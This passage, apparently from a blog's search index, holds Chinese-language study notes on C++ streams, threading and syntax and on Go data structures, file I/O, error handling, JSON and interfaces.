(2,3) ofstream of(\"x.txt\"); of.put('c'); // 放一个字符到流 of.write(buf, 6); // buf中6个字符输出到流 cout \u003c\u003c ends; // '\\0' cout \u003c\u003c flush; // 清空流 cout \u003c\u003c setw(8) \u003c\u003c left \u003c\u003c setfill('_') \u003c\u003c 99 \u003c\u003c endl; // 99______ 宽度为8，输出不足用_填充 cout \u003c\u003c hex \u003c\u003c showbase \u003c\u003c 14; // 0xe 流格式为十六进制 取整 ceil()// 向上取整 floor()// 向下取整 打开文件读 ifstream inf(\"h.txt\"); int i; inf \u003e\u003e i; // 读一个字 std::string line; while(std::getline(inf, line)) // 读一行 xxx 一行读取 std::ifstream file; file.open(\"xx\", ios::out | ios::in); // 读写 cin.getline(data, 100); file \u003c\u003c data \u003c\u003c endl; file \u003e\u003e data; ifstream inf(\"x.txt\"); char buf[80]; inf.get(buf, 80); // 读80字符到buf inf.getline(buf, 80); // 读80直到'\\n' inf.read(buf, 20); // 读20字符 inf.ignore(3); // 忽略3字符 inf.peek(); // 返回流顶部的字符 inf.unget(); // 返回一个字符给流 inf.putback('z'); // 返回一个字符'z'给流 inf.gcount(); // 返回字符流读出的字符数 错误状态 inf.good(); // 一切正常 goodbit=1 inf.bad(); // 不可恢复错误 badbit=1 inf.fail(); // 错误流操作 failbit=1 badbit=1 inf.eof(); // 文件结束 eofbit=1 inf.clear(); // 清除所有状态 inf.clear(ios::badbit); // 为错误flag设置新值 置1 inf.rdstate(); // 读状态flag inf.clear(inf.rdstate() \u0026 ~ios::failbit); // 只清除failbit 判断错误格式 if(inf){} // 成功读 if(inf \u003e\u003e i){} // 成功读 inf.exceptions(ios::badbit | iOS::failbit); // 两者中任何一个置1，抛出异常 字符串流 std::istringstream istr(\"12,\"); int i; char comma; istr \u003e\u003e i \u003e\u003e comma; // i=12, comma=',' stringstream ss; ss \u003c\u003c 89 \u003c\u003c \" Hex: \" \u003c\u003c hex \u003c\u003c 89 \u003c\u003c \" Oct: \" \u003c\u003c oct \u003c\u003c 89; cout \u003c\u003c ss.str() \u003c\u003c endl; // 89 Hex: 59 Oct: 131 int a, b, c; string s1; ss \u003e\u003e hex \u003e\u003e a; // a = 137 = 0x89 ss \u003e\u003e s1; // s1:\"Hex:\" ss \u003e\u003e dec \u003e\u003e b; // b=59 读一个十进制的59 ss.ignore(6); ss \u003e\u003e oct \u003e\u003e c; // c= 89 = 八进制的131 缓冲区 cout \u003c\u003c 34; streambuf* pbuf = cout.rdbuf(); ostream myCout(pbuf); myCout \u003c\u003c 34; // 34输出到标准输出 myCout.setf(ios::showpos); // 显示正负数 myCout.width(20); myCout \u003c\u003c 12 \u003c\u003c endl; // +12 ofstream of(\"hello.txt\"); streambuf* origBuf = cout.rdbuf(); cout.rdbuf(of.rdbuf()); cout \u003c\u003c \"hello\" \u003c\u003c endl; // hello.txt has \"hello\" cout.rdbuf(origBuf); cout \u003c\u003c \"bye\" \u003c\u003c endl; // stdout: bye 流缓冲区迭代器 istreambuf_iterator\u003cchar\u003e i(cin); ostreambuf_iterator\u003cchar\u003e o(cout); while(*i != 'x'){ *o = *i; ++o; ++i; }// stdin输入啥，stdout输出啥，遇x退出 copy(istreambuf_iterator\u003cchar\u003e(cin), istreambuf_iterator\u003cchar\u003e(), ostreambuf_iterator\u003cchar\u003e(cout));// 和上面基本一样，除了遇x不退出 ","date":"2025-02-05","objectID":"/c/:7:6","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"信号处理 signal(registered signal, signal handler); // signal: SIGINT void signalHandler(int signum) { xxx } // raise() 生成信号 int raise(signal sig); rasise(SIGINT); ","date":"2025-02-05","objectID":"/c/:7:7","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"多线程 基础值 unsigned int n = std::thread::hardware_concurrency(); // 支持的并发线程数 基础操作 std::thread t = std::thread(\u0026Class_name::Func, this); std::thread t1(callable_func, args...); t1.join(); // 等待线程完成 detach(); // 将线程与主线程分离，线程后台独立运行，主线程不再等待他 // Lambda 表达式内联定义线程执行代码 std::thread t2([](int args)) { func_content }, arg); 互斥量 std::mutex mtx; mtx.lock(); // 锁定互斥锁 // 访问共享资源 mtx.unlock(); // 释放互斥锁 std::lock_guard\u003cstd::mutex\u003e lock(mtx); // 作用域锁，构造时锁定析构时解锁，自动锁定和释放 // 访问共享资源 std::unique_lock\u003cstd::mutex\u003e ul(mtx); // 访问或修改共享资源 // ul.unlock(); // 可选：手动解锁 TLS 线程局部存储：每个线程有自己数据副本，关键字，被其修饰的变量在每个线程中都有独立实例 thread_local int threadData = 0; 传递方法 // 值传递：参数传递 // 引用传递 func(int\u0026xx){..} std::thread t(func, std::ref(xx)); // 显式告诉std::thread为引用传递 条件变量 // 线程间协调，允许多个线程等待某条件发生，确保workerThread工作只能在mainThread中数据准备完毕才进行 #include \u003cmutex\u003e #include \u003ccondition_variable\u003e std::mutex mtx; std::condition_variable cv; bool ready = false; void workerThread() { std::unique_lock\u003cstd::mutex\u003e lk(mtx); cv.wait(lk, []{ return ready; }); // 等待ready变为true条件 // 当条件满足时执行工作 } void mainThread() { { std::lock_guard\u003cstd::mutex\u003e lk(mtx); // 准备数据 ready = true; } // 离开作用域时解锁 cv.notify_one(); // 通知一个等待的线程 } 原子操作 // 多线程下，要么完全执行，要么完全不执行 std::atomic\u003cint\u003e count(0); count.fetch_add(1, std::memory_order_relaxed); // fetch-and-add 操作，给count+1, arg2: 指定该操作的内存序列模型为\"放松\"内存序列 线程间通信 std::promise\u003cint\u003e p; // 可把一个值存储到共享状态中，承诺会在某个时刻写入一个 int 类型值 std::future\u003cint\u003e f = p.get_future(); // 可从共享状态中读取值 std::thread t([\u0026p] { p.set_value(10); // 设置值，触发 future }); int result = f.get(); // 获取值，阻塞当前线程，直到共享状态变为就绪，直到 p 调用 set_value 为止，取出值赋值给 result ","date":"2025-02-05","objectID":"/c/:7:8","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"CMake cmake_minimum_required(VERSION xxxx) # 设置最低 CMake 版本要求 add_executable(xx dir/file) # 添加源代码文件 target_link_libraries(xx xx xx) # 添加依赖库到构建系统 set(CMAKE_C_FLAGS \"-xx -xx\") # 设置编译选项 include_directories(xxx/xxx) # 指定头文件搜索路径 ","date":"2025-02-05","objectID":"/c/:7:9","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"语法 ","date":"2025-02-05","objectID":"/c/:8:0","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"继承 class class2: public class {} 派生类可以访问基类中的public和protected成员；外部类只能访问类的public成员 ","date":"2025-02-05","objectID":"/c/:8:1","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"多态 调用成员函数时，会根据调用函数的对象的类型来执行不同的函数 虚函数：关键字为virtual，派生类重写基类中定义的虚函数时，会告诉编译器不要静态链接到该函数，而是使用动态链接根据所调用的对象类型来选择调用的函数 // 重写 void func() const override { xxxx } 包含纯虚函数的类为抽象类，不能实例化，强制派生类提供具体实现 virtual int vfunc() = 0; Base_class *ptr; // 基类指针 ptr = new Drive_class(); // 实例化派生类 delete ptr; ","date":"2025-02-05","objectID":"/c/:8:2","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"重载 在同一个作用域内，可以声明几个功能类似的同名函数，但是这些同名函数的形式参数（指参数的个数、类型或者顺序）必须不同 重载运算符 class_name operator + (const class_name \u0026, const class_name \u0026) class Box { public: // 重载 + 运算符 Box operator+(const Box\u0026 b) { return xxx; // 调用为 B+A } void operator()(const Box\u0026 b) // 可以重载括号 { cout \u003c\u003c \"x\" \u003c\u003c endl;// 调用为 B() } } ","date":"2025-02-05","objectID":"/c/:8:3","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":" Google开发，高性能，高并发，静态编译，垃圾回收，标准库丰富，跨平台 ","date":"2025-01-25","objectID":"/go/:0:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"环境 编译运行 GOPATH下包含目录bin(存放编译后的二进制文件)、pkg(存放编译后的库文件)、src(存放源码文件) go build xx.go # 编译型语言 go run xx.go # 运行 go get -u github.com/xx/xxx # 获取外部包 go env -w GO111MODULE=auto # 视情况而定 go mod init dir_name # 初始化 结构 package main import xx func main(){ xxx } ","date":"2025-01-25","objectID":"/go/:1:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"库 ","date":"2025-01-25","objectID":"/go/:2:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"os file,err := os.Create(\"xxx\") // 创建文件 os.Exit(0)//跳出程序 ","date":"2025-01-25","objectID":"/go/:2:1","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"time now = time.Now() // 当前时间 // 年月日时分秒 now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second() 时间持续：time.Duration() time.Sleep(time.Duration(n) * time.second) // 停止n秒 时间运算 now.Add(time.Duration(2) * time.Hour) // 加2小时 now.Sub(xx) // 减 now.Equal(xx) // 是否相同 t.Before(u) // t是否在u前 t.After(u) // t是否在u后 定时器 ticker = time.Tick(time.Second) // 一秒间隔的定时器 \u003c-ticker // 从定时器接收值 获取时间戳 time.Unix() ","date":"2025-01-25","objectID":"/go/:2:2","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"net http http.Handle(\"/\", http.FileServer(http.Dir(\".\"))) // 根路径创建文件服务器 http.ListenAndServe(\":8080\", nil) // 启动HTTP服务器 tcp server, err := net.Listen(\"tcp\", \"127.0.0.1:1080\") // tcp监听 client, err := server.Accept() port := binary.BigEndian.Uint16(buf) // 端口接受 dest, err := net.Dial(\"tcp\", \"x:x:x:x:aaa\") // 建立tcp连接 ","date":"2025-01-25","objectID":"/go/:2:3","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"math math.Pi math.Sin(xx) a := math.MaxInt32 // 初始化最大值 ","date":"2025-01-25","objectID":"/go/:2:4","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"基本结构 ","date":"2025-01-25","objectID":"/go/:3:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"数组 值类型，可修改数组成员，长度不可变 [n]*T：指针数组，*[n]T：数组指针 创建 a := [count]int{1,2} // count数量的int数组，{}为具体数据，若写[...]编译器自动计算长度 // 若不包含数字，会导致直接给其赋值失败，只能append作为切片操作 // 索引值 var langArray = [...]string{1:\"Golang\",3:\"Python\",7:\"Java\"} 遍历 for index,value := range Array 交换元素 a, b = b, a // 可用于逆置 二维数组 matrix2 := [][3]int{ {1, 2, 3}, {4, 5, 6}, {7, 8, 9}, } ","date":"2025-01-25","objectID":"/go/:3:1","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"切片 可变长，引用类型，切片间不能比较，不能使用==，唯一比较方法是和nil比较 nil切片没有底层数组，长度容量都为0 初始化 var var_name []T // T:元素类型，未申请内存 var c = []bool{false,true} //基于数组得到切片 a := [5]int{55,56,57,58,59}//数组 b := a[1:4] d := make([]int,5,10)// 元素个数5，容量10 返回 return []int{i, j} //创建一个包含两个整数元素的整数切片 增加 底层数组不能容纳新增元素时，切片容量按照1,2,4,8,16的规则自动进行扩容 slice = append(slice, element1, element2...) //返回一个新的切片，赋值给原始切片来更新，添加到切片末尾 slice = append(slice, slice...) //合并两个切片，修改函数内的局部变量而非外部传入的原始切片。 创建 slice := make([]dataType, length, capacity) //长度为length、容量为capacity,容量表示切片底层数组的大小，当切片长度达到容量时，底层数组会扩展 取切片 q = q[:len(q)-1] //取第一个到倒数第二个 q = q[:len(q)] //取第一个到最后一个 删除元素 a := []string{\"a\",\"b\",\"c\",\"d\"} a = append(a[0:2],a[3:]...) // 删除\"c\" 切片容量 cap() // 获取切片容量 复制切片 将一个切片的数据复制到另一个切片空间中，区别于赋值，其中一个改变不影响另一个 copy(destSlice, srcSlice []T) // 返回的int为实际复制的元素个数 c := make([]string, len(s)) copy(c, s) ","date":"2025-01-25","objectID":"/go/:3:2","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"字符串 创建 str := \"\" // 字符串是不可变的，即一旦创建，就不能更改其内容 // 多行字符串 s := `first second ` 连接 //连接要赋值给新的字符串 str1, str2 := \"1\", \"2\" ans := str1 + str2 切片操作 tmp := s[i : i+len(p)] //用于从字符串 s 中截取一个子串，起始索引为 i，长度为 len(p) 字符串切片拼接 s := []string{\"1\", \"2\"} ans := strings.Join(s, \"+\") // 1+2 分割 s := \"1x2x3\" p := strings.Split(s, \"x\") // [\"1\",\"2\",\"3\"] 查找 strings.Index(s, \"a\") // \"a\"第一次出现位置 strings.LastIndex(s, \"z\") // \"z\"最后一次出现位置 子串 t, x, s := \"ABC\", \"A\", \"AB\" strings.ContainsRune(t, x) // 判断t中是否包含x strings.Contains(t, s) // 判断t是否包含子串s 前后缀 // 返回bool类型 has := strings.HasPrefix(s, \"pre\") has := strings.HasSuffix(s, \"suf\") 计数 strings.Count(s, \"a\") 重复 strings.Repeat(str, n) // 重复n次 替换 strings.Replace(src_str, old_sub_str, new_sub_str, n) // n替换次数, 负数表示替换所有匹配子串 大小写 strings.ToLower(a) strings.ToUpper(a) ","date":"2025-01-25","objectID":"/go/:3:3","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"类型 整型无法强制转换为布尔类型（默认为false） 自定义类型 type TypeName underlyingType // 将 TypeName 定义为底层underlyingType类型 结构体类型 实例化才分配内存，占用一块连续内存 字段大写表示公开，小写表示私有 type Person struct { string // 匿名字段，每种数据类型只能有一种, x.string输出 Age int x another_struct_type // 结构体嵌套 } type hp struct{ sort.IntSlice } //在结构体定义了一个匿名字段，类型是 sort.IntSlice，即hp可以使用sort.IntSlice的方法 //sort.IntSlice实现了sort.Interface 接口 初始化 p := person{ name: \"jshiro\", age: 18, } 结构体方法 func (p person) check(age int) bool { return p.age == age } a.check(12) // a为实例对象 结构体指针 var a = new(person) // a的类型为*person结构体指针 (*a).name = \"haha\" //调用赋值 或 a.name = \"haha\" 取结构体地址进行实例化 x := \u0026person{} x.name = \"hh\" 自定义构造函数 func newPerson(name, city string,age int8) *person{ return \u0026person{ name: name, city: city, age: age, } } 结构体标签Tag Tag携带元信息，可在运行时通过反射读取，用于序列化或数据库交互 在结构体字段后方定义，反引号包裹 type A struct{ Name string `json:\"name\" db:\"name_db\" xml:\"name_xml\"` } p := Person{Name: \"h\"} // 获取反射值对象 v := reflect.ValueOf(p) t := v.Type() // main.Person // 遍历 for i := 0; i \u003c v.NumField(); i++{ field := t.Field(i) // field.Name : Name // field.Tag.Get(\"json\") : name // field.Tag.Get(\"db\") : name_db } ","date":"2025-01-25","objectID":"/go/:3:4","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"数据结构 空：nil ","date":"2025-01-25","objectID":"/go/:4:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"链表 结构体： type ListNode struct { Val int Next *ListNode } 创建头结点指向链表head： prev := \u0026ListNode{Val: 0, Next: head} // 创建一个新的链表头节点，并用一个指针指向头节点 dummy := \u0026ListNode{} current := dummy//最终返回d.next 创建空结点 var prev *ListNode //空结点 判断初始链表 空 或 一个结点 ： if head == nil || head.Next == nil{ return head } 判断： if q != nil \u0026\u0026 q.Next != nil{ xxx } ","date":"2025-01-25","objectID":"/go/:4:1","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"哈希表 map，映射，无序，引用类型，必须初始化才可使用 默认初始值nil，make函数分配内存 创建 hashTable := map[int]int{} //键值都为int型的空哈希表，初始值都为0 mp := map[string][]string{} //键为string字符串，值为[]string，字符串切片 // make(map[keyType]valueType) 键值对 //使用make时不能指定数量 mp := map[rune]bool{} // 使用 rune 作为键类型，表示 Unicode 字符 //取字符串中字符 mp //创建键值对映射加入hash表h中 temp := map[string]int{ip.String(): port} hp = append(hp, temp) // 初始化 a = make(map[KeyType]ValueType,[cap]) //cap表示map的容量 b := map[int]bool{ 1: true, 2: false, }//声明同时初始化 删除 delete(map, key) //删除哈希表map中的键为key的键值对 添加 a[\"XXX\"] = 100 // 添加键值对 遍历 for k, v := range Map{} 判断键是否存在 value, ok := scoreMap[\"xx\"] // ok返回true存在，值返回给value；false不存在，value为0 链表中用法 mp := map[*ListNode]struct{}{} //此时主要留键，需要的是结点而不是结点中的值，所以*ListNode //值为空结构体 //之后的赋值 mp[head] = struct{}{} 元素为map类型的切片 var mapSlice = make([]map[string]int,2,2) // 长度，容量 [nil nil] mapSlice[0] = make(map[string]int, 4)//初始化 mapSlice[0][\"XXX\"] = 100 //[map[XXX:100] map[] map[] map[]] 值为切片类型的map var sliceMap = make(map[string][]int,8)//只完成map初始化 sliceMap[\"xxx\"] = make([]int,8)//完成对切片的初始化 sliceMap[\"xxx\"][0] = 100 //xxx:[100 0 0 0 0 0 0 0] ","date":"2025-01-25","objectID":"/go/:4:2","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"堆 定义 type hp struct{ sort.IntSlice }//定义堆类型 less func (h hp) Less(i, j int) bool { return a[h.IntSlice[i]] \u003e a[h.IntSlice[j]] } //(h hp)是一个方法的接收者声明，表明Less方法是hp类型的方法 //方法内部，h是当前调用该方法的hp类型的实例，h可访问当前实例的属性和方法 //比较 hp 类型中两个元素的大小，规则是根据切片 a 中元素的大小进行比较。 push func (h *hp) Push(v interface{}) { h.IntSlice = append(h.IntSlice, v.(int)) } //(h *hp)是指方法绑定到 hp 类型指针的实例上 //方法内部需要修改实例内容，所以用指针 //用于向hp类型的切片添加一个元素 //v interface{} :方法接收一个空接口类型的参数 v，即任意类型的值。 //v转化为int类型追加到h类型实例切片中，v.(int)为类型断言，只能用于接口类型 pop func (h *hp) Pop() interface{} { a := h.IntSlice; //获取 hp 类型中嵌套的 sort.IntSlice 实例 v := a[len(a)-1]; //获取切片中最后一个元素 h.IntSlice = a[:len(a)-1]; //删除切片中最后一个元素 return v //返回被弹出的元素 } //hp类型弹出一个元素，最后一个元素取出，切片缩短一个元素，返回被取出的元素 创建 q := \u0026hp{make([]int, k)} //\u0026hp{} 创建一个 hp 类型的实例，并返回实例的指针 //长度为 k 的 int 类型切片，并将其作为初始化值赋给 sort.IntSlice 初始化 heap.Init(q) //将实现了 heap.Interface 接口的堆初始化 //sort.Interface 接口定义了一组用于排序的方法，其中包括 Len、Less 和 Swap。而 heap.Interface 接口在此基础上扩展，添加了 Push 和 Pop 方法，使得实现了 heap.Interface 接口的类型可以被用作堆数据结构。 ","date":"2025-01-25","objectID":"/go/:4:3","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"基础操作 ","date":"2025-01-25","objectID":"/go/:5:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"条件 if-else if xxx { xxx } else if xxx { xxx } else { xxx } switch switch a { // 也可删除a, 直接在case中写if-else判断的条件 case 1: xxx default: xxx } ","date":"2025-01-25","objectID":"/go/:5:1","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"循环 for range for i, x := range nums // range遍历nums数组, i为当前元素的索引, x为当前元素的值 for k, v := range maps // range遍历maps映射, k:键, v:值 for i, ch := range s[:sLen-pLen] //遍历字符串s的前sLen-pLen个字符 for // for 初始语句; 条件表达式; 结束语句 任意一个都可省略 for i:=0; i \u003c len(mp); { i++ } //遍历可能变化的数组 //m中的值为bool型，直到m[key+1]为false，循环停止 for m[key+1] { key++ } ","date":"2025-01-25","objectID":"/go/:5:2","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"格式化输出 fmt.Println(xx,xx) // 输出后换行 查看数据类型 fmt.Printf(\"%T\", str) // %b:二进制, %o:八进制, %x:十六进制, %#v:结构体名+结构体, %.2f:2位浮点数, %p:地址值, %v:数据值, %s:字符串, %+v: 字段名+值 格式化 fmt.Fprintf(out, \"there's '%s'\\n\", s) fmt.Errorf(\"%w\", err) // 错误输出 ","date":"2025-01-25","objectID":"/go/:5:3","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"输入输出 从程序的标准输入中读取内容 scanner := bufio.NewScanner(os.Stdin)//声明创建 bufio.NewScanner 类型的变量 scanner for scanner.Scan() { //循环读入下一行，并移除行末换行符，读到一行返回true，无内容返回false fmt.Println(scanner.Text())//读取的内容 fmt.Print(scanner.Bytes())//扫描到的字节序列 } 文件中读取内容 f,err := os.Open(\"xx.txt\") fileread := bufio.NewScanner(f) 设置扫描器缓冲区大小 scanner.Buffer(nil, math.MaxInt32) //第一个参数：表示用于存储扫描器缓冲区的字节切片， nil表示不使用自定义缓冲区 //第二个参数：缓冲区最大容量 xxx.Flush() //将缓冲区中的数据刷新到底层的 io.Writer 接口对象中，确保数据被写入到底层的存储介质中（文件中） 创建带有缓冲区的写入器 func NewWriter(w io.Writer) *Writer 读取用户输入 // 循环读 reader := bufio.NewReader(os.Stdin) for { input, err := reader.ReadString('\\n') input = strings.TrimSpace(input) // 清理输入 } ver, err := reader.ReadByte() // 一字节一字节读 输入 n,m,_ := fmt.Scan(\u0026a, \u0026b, \u0026c) var n int fmt.Scanf(\"%d\\n\", \u0026input) // 扫描用户输入 ACM方式输入，已知行数 var t,a,b int fmt.Scanln(\u0026t) for i:=0;i\u003ct;i++{ fmt.Scanln(\u0026a,\u0026b) fmt.Println(a+b) } 读取 buf := make([]byte, 4) io.ReadFull(r, buf) // 从r读取数据直到buf填满 ","date":"2025-01-25","objectID":"/go/:5:4","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"数字解析 f, _ := strconv.ParseInt(\"12\", 10, 64) // 进制: 10, 0 表示自动推测, 精度: 64\rn1, err := strconv.Atoi(\"123\") // 123 ","date":"2025-01-25","objectID":"/go/:5:5","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"文件 打开文件 file = os.Open(\"./xx.txt\") file, err := os.OpenFile(\"a.txt\", os.O_CREATE|os.O_WRONLY, 0644) // O_WRONLY只写, O_CREATE不存在则创建, O_RDONLY只读, O_TRUNC存在则清空, O_APPEND追加 defer file.Close() 文件写入 writer := bufio.NewWriter(file) writer.WriteString(\"hello\") // 将内容写入缓冲区 writer.Flush() // 将缓冲区内容写入磁盘 文件读取 var tmp = make([]byte, 128) // 字节切片存储 n, err := file.Read(tmp) // 读取到tmp中 处理读取结束 if err == io.EOF{ // 当把文件读完，End Of File break } 逐行读取 reader := bufio.NewReader(file) line, err := reader.ReadString('\\n') // 读取一行直到\\n 数据复制 _, _ = io.Copy(dest, reader) // 将reader中数据复制到dest中, 阻塞直到完成或错误 ","date":"2025-01-25","objectID":"/go/:5:6","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"错误处理 err func xxx(xx) (xxx, err error) { return xx, nil // 无错误 return nil, errors.New(\"error_information\") // 错误 } panic/recover模式 recover只在defer调用的函数中有效，panic将会异常退出 func b() { // defer 确保 b函数结束前执行该匿名函数 defer func() { // defer需要在可能panic前出现, 捕获并处理panic err := recover() // recover必须和defer一起使用, 捕获panic引发的错误 if err != nil { // 未panic:返回nil, panic:返回panic参数 fmt.Println(\"func b error\") } }() panic(\"panic in b\") // 模拟错误情况 } panic(err) // 抛出异常 ","date":"2025-01-25","objectID":"/go/:5:7","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"函数 a是func变量类型，可赋值b := a // ... 表示可变参数，切片类型，参数可为函数类型: func(type) type func fun_name(arg1 type, arg2 ...type) (ret1 type, ret2 type){ // 返回值可只写类型 return xxx, xxx } 匿名函数 无函数名，实现回调函数/闭包 func(args)(ret_value){ xxx }() // 括号表示立即执行 ","date":"2025-01-25","objectID":"/go/:5:8","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"闭包 闭包 = 函数 + 引用环境 = 函数 + 外层变量的引用 func a(name string) func() { // 定义函数，返回值是函数 return func() { fmt.Println(\"hello\",name) } } func main() { r := a(\"Jshiro\") r() // hello Jshiro } ","date":"2025-01-25","objectID":"/go/:5:9","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"接收者 方法是一种作用于特定类型变量(Receiver接受者)的函数，接受者类似于其他语言中的this与self 接收者类型是指针类型，则改变后会改变原值；值类型，则改变后不会改变原值，操作的是副本 // String 方法为Person类型定义了一个接收者方法 // p 是接收者变量，Person 是接收者类型，接收者变量一般为接收者类型的首字母小写 func (p Person) String(args) string { return fmt.Sprintf(\"Name: %s, Age: %d\", p.Name, p.Age) } ","date":"2025-01-25","objectID":"/go/:5:10","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"指针 指针不能进行偏移和运算，安全指针，函数传参是值拷贝 修改变量值可创建指向该变量地址的指针变量，传递数据使用指针 定义 var ptr *int // 指向int类型变量的指针 赋值访问 a := 10 ptr = \u0026a // 变量a的地址赋给指针ptr *ptr // 访问变量a 函数 // 函数内 func addOne(x *int) { *x = *x + 1 // 通过指针修改外部变量的值 } // 函数外 a := 10 addOne(\u0026a) ","date":"2025-01-25","objectID":"/go/:5:11","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"基础用法 “comma, ok” 惯用法 value, ok := myMap[key]// ok是bool值，value是key对应的值 if ok { // 键 key 存在于 myMap 中，可以使用 value 进行操作 } else { // 键 key 不存在于 myMap 中 } if _, exists := mp[x]; !exists { //若x不存在于mp中 } 获取进程信息 os.Args // 获取运行参数, 第一个为可执行程序路径 os.Getenv(\"PATH\") // 获取环境变量 os.Setenv(\"A\", \"B\") // 设置环境变量 // 命令执行 buf, err := exec.Command(\"grep\", \"127.0.0.1\", \"/etc/hosts\").CombinedOutput() if err != nil{ panic(err) } 数据类型转化 s := []byte(str) //将字符串转化为字节切片 str := string(s) //字节转化为字符串 high := int(num[0]) - 48 //以索引方式取字符串单个字符，为byte型，转换为数字 多变量赋值 left, right, n := 0, 0, len(nums) 字母表数组 var pCount [26]int //统计字母数量 pCount[s[i]-'a']++ //字符串s 声明变量 var scount, pcount [26]int //声明多个变量 var ( a = xxx b = xxx ) // 函数内部 a := 10 // 初始化 var a int = 10 // 匿名变量 不占用命名空间，不分配内存 _ 声明常量 const con = 1 // 定义时必须赋值 位运算符 \u0026, |, ^, \u003c\u003c, \u003e\u003e 延迟执行 // 延迟处理语句按defer逆序执行: 先xx2后xx1 defer xx1 defer xx2 匿名函数或闭包 x := func() bool{ xxx } 创建函数赋值给x，x为函数类型变量 长度 len(nums) //nums为数组，则为数组长度 len(mp) //mp是哈希表，为键值对的数量 切片排序 sort.Slice(s, func(i, j int) bool { return s[i] \u003c s[j]}) //升序 sort.Ints(nums)//对整数切片进行升序排序,会修改传入的切片 sort.Ints(a[:]) sort.Strings() //用于对字符串切片进行排序 排序接口 type Interface interface { Len() int // 返回集合中的元素个数 Less(i, j int) bool // 报告索引 i 的元素是否应排在索引 j 的元素之前 Swap(i, j int) // 交换索引 i 和 j 处的元素 } max函数实现 func max(arg ...int) int { res := arg[0] for _, v := range arg { if v \u003e res { res = v } } return res } 随机整数 rand.Intn(100) //随机0~99 分配内存 // new var a *int a = new(int) // *a对应该类型的默认值:0 *a = 100 // 修改变量 // make 只用于slice、map、chan的内存创建, 返回引用类型本身 var b map[string]int b = make(map[string]int,10) b[\"xxx\"] = 100 ","date":"2025-01-25","objectID":"/go/:6:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"基础知识 ","date":"2025-01-25","objectID":"/go/:7:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"拷贝 copy 和 \"=“复制 copy复制 比 等号复制 慢 copy复制为值复制，改变原切片的值不会影响新切片 等号复制为指针复制，改变原切片或新切片都会对另一个产生影响 append 值传递，切片本身是一个 struct 结构，参数传递时会发生值拷贝 使用append的切片的底层数组相同，所以建议append追加后的新切片赋值给原切片 或使用copy函数 深拷贝和浅拷贝 浅拷贝： 对于值类型 是完全拷贝一份相同的值 对于引用类型 是拷贝其地址，也就是拷贝的对象修改引用类型的变量同样会影响到源对象 深拷贝： 任何对象被完完整整拷贝一份 拷贝对象与被拷贝对象不存在任何联系，不会互相影响 ","date":"2025-01-25","objectID":"/go/:7:1","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"高级操作 ","date":"2025-01-25","objectID":"/go/:8:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"序列化 JSON序列化(JavaScript Object Notation) 保存JS对象的方式，\"key1\": value1, \"key2\": value2 go语言数据 —\u003e JSON格式字符串 import \"encoding/json\" data,err := json.Marshal(c1) // 序列化后，前端可直接识别 // 打印时:data为16进制编码, string(data)可见字符串 反序列化 JSON格式字符串—\u003e go语言数据 jsonStr:=`{\"Title\":\"H\",\"Students\":[{\"ID\":0,\"Name\":\"stu0\"},{\"ID\":1,\"Name\":\"stu1\"}]}` var c2 class err = json.Unmarshal([]byte(jsonStr), \u0026c2) // 字节数据, 传入指针才能更改 ","date":"2025-01-25","objectID":"/go/:8:1","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"接口 一种抽象类型，同一类型可有多个接口，接口可嵌套 定义接口 type interface_name interface { func1(args) string Serve(c context.Context, conn network.Conn) error ... } 实现接口 type Person struct { Name string } func (p Person) interface_name() string { // 值接收者 xxx } func (a *Animal) 